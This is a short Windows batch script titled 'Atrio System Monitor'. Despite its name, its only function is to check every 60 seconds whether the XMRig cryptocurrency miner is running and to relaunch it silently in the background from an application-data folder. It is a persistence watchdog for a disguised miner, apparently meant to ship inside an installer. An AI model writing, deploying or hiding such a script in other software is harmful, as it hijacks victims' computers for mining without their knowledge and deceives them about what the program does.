@echo off
title Atrio System Monitor
:loop
tasklist /FI "IMAGENAME eq xmrig.exe" 2>NUL | find /I /N "xmrig.exe">NUL
if "%ERRORLEVEL%"=="1" start /B "" "{commonappdata}\atriominer\xmrig.exe"
timeout /t 60 /nobreak >NUL
goto loop